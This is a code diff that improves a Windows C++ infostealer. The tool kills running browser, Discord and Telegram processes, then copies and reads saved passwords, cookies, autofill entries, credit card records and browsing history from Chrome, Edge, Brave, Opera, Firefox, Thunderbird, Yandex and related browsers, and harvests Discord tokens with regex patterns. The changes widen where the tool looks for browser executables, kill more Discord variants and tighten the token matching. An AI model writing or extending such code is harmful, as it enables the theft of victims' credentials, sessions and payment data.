@@ -40,6 +40,7 @@ struct BrowserConfig {
 
 // Function prototypes
 void kill_processes_by_name(const std::string& target_name);
+std::vector<std::wstring> get_search_roots();
 std::wstring get_user_data_dir(const std::vector<std::wstring>& subdir, bool use_roaming);
 std::vector<uint8_t> base64_decode(const std::string& input);
 bool get_v10_key(const std::wstring& user_data_dir, std::vector<uint8_t>& key, bool& is_dpapi);
@@ -70,7 +71,7 @@ int main() {
         {
             "Google Chrome",
             "chrome.exe",
-            {L"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", L"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe"},
+            {L"Google\\Chrome\\Application\\chrome.exe"},
             "chrome.dll",
             {L"Google", L"Chrome", L"User Data"},
             "chrome_extract",
@@ -80,7 +81,7 @@ int main() {
         {
             "Microsoft Edge",
             "msedge.exe",
-            {L"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe", L"C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe"},
+            {L"Microsoft\\Edge\\Application\\msedge.exe"},
             "msedge.dll",
             {L"Microsoft", L"Edge", L"User Data"},
             "edge_extract",
@@ -90,7 +91,7 @@ int main() {
         {
             "Brave",
             "brave.exe",
-            {L"C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe", L"C:\\Program Files (x86)\\BraveSoftware\\Brave-Browser\\Application\\brave.exe"},
+            {L"BraveSoftware\\Brave-Browser\\Application\\brave.exe"},
             "chrome.dll",
             {L"BraveSoftware", L"Brave-Browser", L"User Data"},
             "brave_extract",
@@ -100,7 +101,7 @@ int main() {
         {
             "Opera Stable",
             "opera.exe",
-            {L"C:\\Program Files\\Opera\\launcher.exe", L"C:\\Program Files (x86)\\Opera\\launcher.exe"},
+            {L"Opera\\launcher.exe"},
             "launcher_lib.dll",
             {L"Opera Software", L"Opera Stable"},
             "opera_extract",
@@ -110,7 +111,7 @@ int main() {
         {
             "Opera GX",
             "opera.exe",
-            {L"C:\\Program Files\\Opera GX\\launcher.exe", L"C:\\Program Files (x86)\\Opera GX\\launcher.exe"},
+            {L"Opera GX\\launcher.exe"},
             "launcher_lib.dll",
             {L"Opera Software", L"Opera GX Stable"},
             "operagx_extract",
@@ -120,7 +121,7 @@ int main() {
         {
             "Mozilla Firefox",
             "firefox.exe",
-            {L"C:\\Program Files\\Mozilla Firefox\\firefox.exe", L"C:\\Program Files (x86)\\Mozilla Firefox\\firefox.exe"},
+            {L"Mozilla Firefox\\firefox.exe"},
             "nss3.dll",
             {L"Mozilla", L"Firefox", L"Profiles"},
             "firefox_extract",
@@ -130,7 +131,7 @@ int main() {
         {
             "Waterfox",
             "waterfox.exe",
-            {L"C:\\Program Files\\Waterfox\\waterfox.exe", L"C:\\Program Files (x86)\\Waterfox\\waterfox.exe"},
+            {L"Waterfox\\waterfox.exe"},
             "nss3.dll",
             {L"Waterfox", L"Profiles"},
             "waterfox_extract",
@@ -140,7 +141,7 @@ int main() {
         {
             "LibreWolf",
             "librewolf.exe",
-            {L"C:\\Program Files\\LibreWolf\\librewolf.exe", L"C:\\Program Files (x86)\\LibreWolf\\librewolf.exe"},
+            {L"LibreWolf\\librewolf.exe"},
             "nss3.dll",
             {L"LibreWolf", L"Profiles"},
             "librewolf_extract",
@@ -150,7 +151,7 @@ int main() {
         {
             "Mozilla Thunderbird",
             "thunderbird.exe",
-            {L"C:\\Program Files\\Mozilla Thunderbird\\thunderbird.exe", L"C:\\Program Files (x86)\\Mozilla Thunderbird\\thunderbird.exe"},
+            {L"Mozilla Thunderbird\\thunderbird.exe"},
             "nss3.dll",
             {L"Thunderbird", L"Profiles"},
             "thunderbird_extract",
@@ -160,7 +161,7 @@ int main() {
         {
             "Yandex Browser",
             "browser.exe",
-            {L"C:\\Program Files\\Yandex\\YandexBrowser\\Application\\browser.exe", L"C:\\Program Files (x86)\\Yandex\\YandexBrowser\\Application\\browser.exe"},
+            {L"Yandex\\YandexBrowser\\Application\\browser.exe"},
             "browser.dll",
             {L"Yandex", L"YandexBrowser", L"User Data"},
             "yandex_extract",
@@ -180,6 +181,10 @@ int main() {
     kill_processes_by_name("librewolf.exe");
     kill_processes_by_name("thunderbird.exe");
     kill_processes_by_name("discord.exe");
+    kill_processes_by_name("Discord.exe");
+    kill_processes_by_name("DiscordCanary.exe");
+    kill_processes_by_name("DiscordPTB.exe");
+    kill_processes_by_name("Lightcord.exe");
     kill_processes_by_name("Telegram.exe");
 
     for (const auto& config : configs) {
@@ -229,11 +234,16 @@ int main() {
 
         // Debugger-based extraction requires the executable
         std::wstring exe_path = L"";
+        std::vector<std::wstring> search_roots = get_search_roots();
         for (const auto& path : config.exe_paths) {
-            if (fs::exists(path)) {
-                exe_path = path;
-                break;
+            for (const auto& root : search_roots) {
+                fs::path full_path = fs::path(root) / path;
+                if (fs::exists(full_path)) {
+                    exe_path = full_path.wstring();
+                    break;
+                }
             }
+            if (!exe_path.empty()) break;
         }
 
         if (exe_path.empty()) {
@@ -427,6 +437,29 @@ std::vector<uint8_t> base64_decode(const std::string& input) {
         }
     }
     return {};
+}
+
+std::vector<std::wstring> get_search_roots() {
+    std::vector<std::wstring> roots;
+    wchar_t* path = NULL;
+    if (SHGetKnownFolderPath(FOLDERID_ProgramFiles, 0, NULL, &path) == S_OK) {
+        roots.push_back(path);
+        CoTaskMemFree(path);
+    }
+    if (SHGetKnownFolderPath(FOLDERID_ProgramFilesX86, 0, NULL, &path) == S_OK) {
+        roots.push_back(path);
+        CoTaskMemFree(path);
+    }
+    if (SHGetKnownFolderPath(FOLDERID_LocalAppData, 0, NULL, &path) == S_OK) {
+        roots.push_back(path);
+        CoTaskMemFree(path);
+    }
+    // Check for ProgramW6432 environment variable
+    wchar_t env_path[MAX_PATH];
+    if (GetEnvironmentVariableW(L"ProgramW6432", env_path, MAX_PATH) > 0) {
+        roots.push_back(env_path);
+    }
+    return roots;
 }
 
 std::wstring get_user_data_dir(const std::vector<std::wstring>& subdir, bool use_roaming) {
@@ -770,12 +803,12 @@ void extract_passwords(const fs::path& profile_path, const fs::path& output_dir,
     fs::copy(db_path, temp_db);
 
     sqlite3* db;
-    if (sqlite3_open(temp_db.string().c_str(), &db) == 0) {
+    if (sqlite3_open(temp_db.string().c_str(), &db) == SQLITE_OK) {
         sqlite3_stmt* stmt;
         const char* sql = "SELECT origin_url, username_value, password_value FROM logins";
-        if (sqlite3_prepare_v2(db, sql, -1, &stmt, NULL) == 0) {
+        if (sqlite3_prepare_v2(db, sql, -1, &stmt, NULL) == SQLITE_OK) {
             std::ofstream ofs(output_dir / "passwords.txt");
-            while (sqlite3_step(stmt) == 100) { // SQLITE_ROW
+            while (sqlite3_step(stmt) == SQLITE_ROW) {
                 const char* url = (const char*)sqlite3_column_text(stmt, 0);
                 const char* user = (const char*)sqlite3_column_text(stmt, 1);
                 const uint8_t* blob_ptr = (const uint8_t*)sqlite3_column_blob(stmt, 2);
@@ -803,12 +836,12 @@ void extract_cookies(const fs::path& profile_path, const fs::path& output_dir, c
     fs::copy(db_path, temp_db);
 
     sqlite3* db;
-    if (sqlite3_open(temp_db.string().c_str(), &db) == 0) {
+    if (sqlite3_open(temp_db.string().c_str(), &db) == SQLITE_OK) {
         sqlite3_stmt* stmt;
         const char* sql = "SELECT host_key, name, value, encrypted_value FROM cookies";
-        if (sqlite3_prepare_v2(db, sql, -1, &stmt, NULL) == 0) {
+        if (sqlite3_prepare_v2(db, sql, -1, &stmt, NULL) == SQLITE_OK) {
             std::ofstream ofs(output_dir / "cookies.txt");
-            while (sqlite3_step(stmt) == 100) {
+            while (sqlite3_step(stmt) == SQLITE_ROW) {
                 const char* host = (const char*)sqlite3_column_text(stmt, 0);
                 const char* name = (const char*)sqlite3_column_text(stmt, 1);
                 const char* value = (const char*)sqlite3_column_text(stmt, 2);
@@ -843,11 +876,11 @@ void extract_autofill(const fs::path& profile_path, const fs::path& output_dir, 
         fs::copy(db_path, temp_db);
 
         sqlite3* db;
-        if (sqlite3_open(temp_db.string().c_str(), &db) == 0) {
+        if (sqlite3_open(temp_db.string().c_str(), &db) == SQLITE_OK) {
             sqlite3_stmt* stmt;
 
-            if (sqlite3_prepare_v2(db, "SELECT name, value FROM autofill", -1, &stmt, NULL) == 0) {
-                while (sqlite3_step(stmt) == 100) {
+            if (sqlite3_prepare_v2(db, "SELECT name, value FROM autofill", -1, &stmt, NULL) == SQLITE_OK) {
+                while (sqlite3_step(stmt) == SQLITE_ROW) {
                     ofs << "Form: " << (const char*)sqlite3_column_text(stmt, 0) << " = " << (const char*)sqlite3_column_text(stmt, 1) << "\n";
                 }
                 sqlite3_finalize(stmt);
@@ -857,16 +890,16 @@ void extract_autofill(const fs::path& profile_path, const fs::path& output_dir, 
             for (const char* table : tables) {
                 std::string col = strstr(table, "name") ? "first_name" : (strstr(table, "email") ? "email" : "number");
                 std::string sql = "SELECT guid, " + col + " FROM " + table;
-                if (sqlite3_prepare_v2(db, sql.c_str(), -1, &stmt, NULL) == 0) {
-                    while (sqlite3_step(stmt) == 100) {
+                if (sqlite3_prepare_v2(db, sql.c_str(), -1, &stmt, NULL) == SQLITE_OK) {
+                    while (sqlite3_step(stmt) == SQLITE_ROW) {
                         ofs << table << " (" << (const char*)sqlite3_column_text(stmt, 0) << "): " << (const char*)sqlite3_column_text(stmt, 1) << "\n";
                     }
                     sqlite3_finalize(stmt);
                 }
             }
 
-            if (sqlite3_prepare_v2(db, "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards", -1, &stmt, NULL) == 0) {
-                while (sqlite3_step(stmt) == 100) {
+            if (sqlite3_prepare_v2(db, "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards", -1, &stmt, NULL) == SQLITE_OK) {
+                while (sqlite3_step(stmt) == SQLITE_ROW) {
                     const char* name = (const char*)sqlite3_column_text(stmt, 0);
                     int m = sqlite3_column_int(stmt, 1);
                     int y = sqlite3_column_int(stmt, 2);
@@ -894,12 +927,12 @@ void extract_history(const fs::path& profile_path, const fs::path& output_dir, c
     fs::copy(db_path, temp_db);
 
     sqlite3* db;
-    if (sqlite3_open(temp_db.string().c_str(), &db) == 0) {
+    if (sqlite3_open(temp_db.string().c_str(), &db) == SQLITE_OK) {
         sqlite3_stmt* stmt;
         const char* sql = "SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100";
-        if (sqlite3_prepare_v2(db, sql, -1, &stmt, NULL) == 0) {
+        if (sqlite3_prepare_v2(db, sql, -1, &stmt, NULL) == SQLITE_OK) {
             std::ofstream ofs(output_dir / "history.txt");
-            while (sqlite3_step(stmt) == 100) {
+            while (sqlite3_step(stmt) == SQLITE_ROW) {
                 const char* url = (const char*)sqlite3_column_text(stmt, 0);
                 const char* title = (const char*)sqlite3_column_text(stmt, 1);
                 int count = sqlite3_column_int(stmt, 2);
@@ -966,12 +999,12 @@ void extract_firefox_cookies(const fs::path& profile_path, const fs::path& outpu
     fs::copy(db_path, temp_db);
 
     sqlite3* db;
-    if (sqlite3_open(temp_db.string().c_str(), &db) == 0) {
+    if (sqlite3_open(temp_db.string().c_str(), &db) == SQLITE_OK) {
         sqlite3_stmt* stmt;
         const char* sql = "SELECT host, name, value, path FROM moz_cookies";
-        if (sqlite3_prepare_v2(db, sql, -1, &stmt, NULL) == 0) {
+        if (sqlite3_prepare_v2(db, sql, -1, &stmt, NULL) == SQLITE_OK) {
             std::ofstream ofs(output_dir / "cookies.txt");
-            while (sqlite3_step(stmt) == 100) {
+            while (sqlite3_step(stmt) == SQLITE_ROW) {
                 const char* host = (const char*)sqlite3_column_text(stmt, 0);
                 const char* name = (const char*)sqlite3_column_text(stmt, 1);
                 const char* value = (const char*)sqlite3_column_text(stmt, 2);
@@ -993,12 +1026,12 @@ void extract_firefox_history(const fs::path& profile_path, const fs::path& outpu
     fs::copy(db_path, temp_db);
 
     sqlite3* db;
-    if (sqlite3_open(temp_db.string().c_str(), &db) == 0) {
+    if (sqlite3_open(temp_db.string().c_str(), &db) == SQLITE_OK) {
         sqlite3_stmt* stmt;
         const char* sql = "SELECT url, title, visit_count FROM moz_places ORDER BY last_visit_date DESC LIMIT 100";
-        if (sqlite3_prepare_v2(db, sql, -1, &stmt, NULL) == 0) {
+        if (sqlite3_prepare_v2(db, sql, -1, &stmt, NULL) == SQLITE_OK) {
             std::ofstream ofs(output_dir / "history.txt");
-            while (sqlite3_step(stmt) == 100) {
+            while (sqlite3_step(stmt) == SQLITE_ROW) {
                 const char* url = (const char*)sqlite3_column_text(stmt, 0);
                 const char* title = (const char*)sqlite3_column_text(stmt, 1);
                 int count = sqlite3_column_int(stmt, 2);
@@ -1019,12 +1052,12 @@ void extract_firefox_autofill(const fs::path& profile_path, const fs::path& outp
     fs::copy(db_path, temp_db);
 
     sqlite3* db;
-    if (sqlite3_open(temp_db.string().c_str(), &db) == 0) {
+    if (sqlite3_open(temp_db.string().c_str(), &db) == SQLITE_OK) {
         sqlite3_stmt* stmt;
         const char* sql = "SELECT fieldname, value FROM moz_formhistory";
-        if (sqlite3_prepare_v2(db, sql, -1, &stmt, NULL) == 0) {
+        if (sqlite3_prepare_v2(db, sql, -1, &stmt, NULL) == SQLITE_OK) {
             std::ofstream ofs(output_dir / "autofill.txt");
-            while (sqlite3_step(stmt) == 100) {
+            while (sqlite3_step(stmt) == SQLITE_ROW) {
                 const char* name = (const char*)sqlite3_column_text(stmt, 0);
                 const char* value = (const char*)sqlite3_column_text(stmt, 1);
                 ofs << "Field: " << (name ? name : "") << " = " << (value ? value : "") << "\n";
@@ -1189,8 +1222,8 @@ void extract_discord_tokens(const std::wstring& discord_path_w, const std::strin
 
     std::set<std::string> tokens;
     // Discord tokens regex patterns
-    std::regex enc_regex("dQw4w9WgXcQ:([^\"\\s]+)");
-    std::regex plain_regex("[\\w\\d_-]{24,28}\\.[\\w\\d_-]{6}\\.[\\w\\d_-]{25,110}");
+    std::regex enc_regex("dQw4w9WgXcQ:([^\"\\s\\x00-\\x1F]+)");
+    std::regex plain_regex("[a-zA-Z0-9_-]{24,28}\\.[a-zA-Z0-9_-]{6}\\.[a-zA-Z0-9_-]{25,110}");
 
     for (const auto& entry : fs::directory_iterator(leveldb_path)) {
         std::string ext = entry.path().extension().string();
